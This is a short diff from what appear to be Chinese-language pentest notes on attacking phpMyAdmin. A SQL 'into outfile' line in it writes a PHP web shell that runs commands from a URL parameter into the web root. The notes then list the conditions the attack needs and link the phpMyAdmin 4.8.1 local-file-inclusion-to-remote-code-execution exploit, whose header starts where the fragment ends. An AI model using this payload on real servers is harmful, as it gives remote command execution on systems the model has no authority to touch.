@@ -7,7 +7,9 @@ select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/getshell.php"
 - 拥有可写权限
 - 是union注入(如果是注入的话)
 
-exp
+
+# 本地文件包含Version: 4.8.0, 4.8.1
+https://www.exploit-db.com/exploits/40185
 ```
 # Exploit Title: phpMyAdmin 4.8.1 - Local File Inclusion to Remote Code Execution
 # Date: 2018-06-21
